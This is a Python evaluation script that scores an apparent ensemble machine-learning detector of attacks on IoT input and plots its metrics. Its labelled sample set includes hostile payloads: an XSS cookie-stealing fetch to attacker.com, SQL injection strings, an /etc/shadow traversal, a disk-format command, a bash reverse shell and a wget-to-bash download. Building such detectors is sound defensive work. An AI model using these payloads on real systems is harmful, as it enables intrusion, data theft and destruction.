import os
import sys
import numpy as np
import matplotlib.pyplot as plt
import seaborn as sns
from sklearn.metrics import accuracy_score, precision_score, recall_score, f1_score, confusion_matrix

# Setup Django environment so we can import our models and engine
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "blackchine_project.settings")

# Import the machine learning engine
from user.ml_engine import EnsemblePredictor

print("Initializing the Ensemble Predictor for Evaluation...")
# We use the instance
engine = EnsemblePredictor()

# --- SYNTHETIC EVALUATION DATASET ---
# We will use an extended dataset specifically to evaluate the F1 score and Confusion Matrices
evaluation_samples = [
    # BENIGN (0)
    ("IOT_400,22.1,65,Delhi,active,24.5", 0),
    ("GPS_LAT=12.9716 GPS_LON=77.5946 alt=900m", 0),
    ("sensor_value=12.3 timestamp=2026-03-01T12:00:00", 0),
    ("humidity=65% temp=24.5C wind_speed=14kmh", 0),
    ("battery_level=90 signal_strength=-50dBm", 0),
    ("device online heartbeat ok", 0),
    ("water_level=normal flood=0", 0),
    ("soil_moisture=40% ph=7.0", 0),
    ("voltage=230.5 current=5.1 status=OK", 0),
    ("door=open window=closed ac=off", 0),
    
    # MALICIOUS XSS (1)
    ("<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>", 1),
    ("onerror=alert(1)", 1),
    ("javascript:alert('hacked')", 1),
    ("<img src=x onerror=alert('XSS')>", 1),
    ("document.write(atob('PGgxPkhBQ0tFRDwvaDE+'))", 1),
    
    # MALICIOUS SQLi (1)
    ("DROP TABLE sensor_logs;--", 1),
    ("SELECT * FROM users WHERE id=1 OR 1=1;", 1),
    ("UNION ALL SELECT username, password FROM admin", 1),
    ("admin' -- login bypass", 1),
    ("1; EXEC xp_cmdshell('shutdown -s')", 1),
    
    # MALICIOUS PATH TRAVERSAL / CMD (1)
    ("../../../../../etc/shadow", 1),
    ("cmd.exe /c format c:", 1),
    ("/bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1", 1),
    ("../../var/www/html/index.php", 1),
    ("| wget http://malware.com/shell.txt | bash", 1),
]

true_labels = [sample[1] for sample in evaluation_samples]
cnn_preds = []
lstm_preds = []
mrn_preds = []
ensemble_preds = []

print("\nRunning evaluation on test dataset...")
for text, label in evaluation_samples:
    # Get scores (probabilities)
    cnn_prob = engine.cnn.predict(text)
    lstm_prob = engine.lstm.predict(text)
    mrn_prob = engine.mrn.predict(text)
    
    # Convert probability to class prediction (>0.5 for individual, >0.8 max for ensemble)
    cnn_preds.append(1 if cnn_prob > 0.5 else 0)
    lstm_preds.append(1 if lstm_prob > 0.5 else 0)
    mrn_preds.append(1 if mrn_prob > 0.5 else 0)
    
    ensemble_prob = max(cnn_prob, lstm_prob, mrn_prob)
    ensemble_preds.append(1 if ensemble_prob >= 0.80 else 0)

# Calculate Metrics
def get_metrics(true_y, pred_y):
    return {
        "Accuracy": accuracy_score(true_y, pred_y),
        "Precision": precision_score(true_y, pred_y, zero_division=0),
        "Recall": recall_score(true_y, pred_y, zero_division=0),
        "F1-Score": f1_score(true_y, pred_y, zero_division=0)
    }

models = {
    "CNN (Spatial)": cnn_preds,
    "LSTM (Temporal)": lstm_preds,
    "MRN (Structural)": mrn_preds,
    "Ensemble (Proposed)": ensemble_preds
}

metrics_data = {name: get_metrics(true_labels, preds) for name, preds in models.items()}

# ----------------- GRAPH 1: BAR CHART COMPARISON -----------------
import pandas as pd
df = pd.DataFrame(metrics_data).T
print("\n--- Evaluation Metrics ---")
print(df)

plt.figure(figsize=(10, 6))
df.plot(kind='bar', colormap='viridis', edgecolor='black')
plt.title("Model Performance Comparison (IoT Attack Detection)")
plt.ylabel("Score (0.0 to 1.0)")
plt.ylim(0, 1.1)
plt.xticks(rotation=45, ha='right')
plt.legend(loc='lower right')
plt.tight_layout()
plt.savefig("metric_bar_chart.png", dpi=300)
print("\n[+] Saved Graph: metric_bar_chart.png")

# ----------------- GRAPH 2: ENSEMBLE CONFUSION MATRIX -----------------
cm = confusion_matrix(true_labels, ensemble_preds)
plt.figure(figsize=(6, 5))
sns.heatmap(cm, annot=True, fmt='d', cmap='Blues', 
            xticklabels=['Predicted Benign', 'Predicted Attack'],
            yticklabels=['Actual Benign', 'Actual Attack'])
plt.title("Confusion Matrix: Ensemble Model")
plt.tight_layout()
plt.savefig("ensemble_confusion_matrix.png", dpi=300)
print("[+] Saved Graph: ensemble_confusion_matrix.png")

print("\nSUCCESS! All evaluation metrics and academic graphs have been generated.")
